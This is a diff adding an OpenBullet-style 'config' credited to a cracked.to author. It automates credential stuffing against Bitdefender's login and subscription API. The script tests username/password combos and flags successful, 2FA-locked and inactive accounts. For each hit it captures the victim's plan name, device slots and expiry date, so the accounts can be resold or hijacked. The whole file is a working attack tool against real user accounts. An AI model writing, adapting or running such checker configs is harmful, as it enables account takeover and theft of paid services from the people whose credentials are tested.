@@ -1,0 +1,123 @@
+[SETTINGS]
+{
+  "Name": "BitdefenderNew",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-15T17:58:57.9900386-04:00",
+  "AdditionalInfo": "",
+  "Author": "Eminem (cracked.to)",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "id" 
+
+REQUEST POST "https://login.bitdefender.com/v1/user/lookup" 
+  CONTENT "{\"user\":\"<USER>\",\"redirect_url\":\"https://central.bitdefender.com/dashboard?browserLang=fr_FR\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-nimbus-clientid: <id>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "UserDoesNotExistError" 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+
+PARSE "<SOURCE>" JSON "user_token" -> VAR "t" 
+
+PARSE "<SOURCE>" JSON "fingerprint" -> VAR "f" 
+
+REQUEST POST "https://login.bitdefender.com/v1/user/signin" 
+  CONTENT "{\"fingerprint\":\"<f>\",\"token\":\"<t>\",\"pass\":\"<PASS>\",\"redirect_url\":\"https://central.bitdefender.com/dashboard?browserLang=fr_FR\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-nimbus-clientid: <id>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Cannot login with these credentials!" 
+  KEYCHAIN Success OR 
+    KEY "\"user_token\":\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"account\":\"inactive\"" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"usage\":\"2fa\"" 
+    KEY "HardlockResendEmail" 
+
+PARSE "<SOURCE>" JSON "user_token" -> VAR "t2" 
+
+REQUEST POST "https://nimbus.bitdefender.net/connect/login" 
+  CONTENT "{\"id\":13,\"jsonrpc\":\"2.0\",\"method\":\"connect\",\"params\":{\"partner_user_token\":\"<t2>\",\"partner_id\":\"com.bitdefender\",\"device_id\":\"web\",\"app_id\":\"com.bitdefender.connect_mgmt\"}}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-nimbus-clientid: <id>" 
+
+PARSE "<SOURCE>" JSON "user_token" -> VAR "t3" 
+
+REQUEST POST "https://nimbus.bitdefender.net/connect/subscription" 
+  CONTENT "{\"id\":88,\"jsonrpc\":\"2.0\",\"method\":\"list\",\"params\":{\"connect_source\":{\"user_token\":\"<t3>\",\"device_id\":\"web\",\"app_id\":\"com.bitdefender.connect_mgmt\"}}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-nimbus-clientid: <id>" 
+
+PARSE "<SOURCE>" JSON "bundle_friendly_name" CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" JSON "slots" CreateEmpty=FALSE -> CAP "Devices" 
+
+PARSE "<SOURCE>" JSON "end_date" -> VAR "e" 
+
+FUNCTION UnixTimeToDate "<e>" -> CAP "Expire" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"result\":[]" 
+
